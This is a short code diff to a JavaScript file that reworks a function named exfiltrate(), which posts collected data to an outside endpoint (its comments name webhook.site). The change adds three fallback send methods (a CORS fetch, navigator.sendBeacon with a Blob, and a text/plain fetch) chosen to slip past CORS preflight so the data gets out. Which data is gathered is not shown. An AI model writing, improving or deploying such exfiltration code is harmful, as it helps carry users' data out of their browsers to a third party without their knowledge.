@@ -200,21 +200,35 @@ function pr(p, t) {
 // ============================================================================
 async function exfiltrate(data) {
   if (!EXFIL_ENDPOINT) return false;
+  const payload = JSON.stringify(data);
+
+  // Method 1: fetch with CORS (webhook.site supports it)
   try {
-    const resp = await fetch(EXFIL_ENDPOINT, {
+    await fetch(EXFIL_ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data),
-      mode: 'no-cors'  // webhook.site may not have CORS headers
+      body: payload
     });
     return true;
-  } catch (e) {
-    // Fallback: sendBeacon
-    try {
-      navigator.sendBeacon(EXFIL_ENDPOINT, JSON.stringify(data));
-      return true;
-    } catch (e2) { return false; }
-  }
+  } catch (e1) {}
+
+  // Method 2: sendBeacon with Blob (no CORS preflight for simple types)
+  try {
+    const blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon(EXFIL_ENDPOINT, blob)) return true;
+  } catch (e2) {}
+
+  // Method 3: fetch with text/plain (always a simple request, no preflight)
+  try {
+    await fetch(EXFIL_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: payload
+    });
+    return true;
+  } catch (e3) {}
+
+  return false;
 }
 
 // ============================================================================
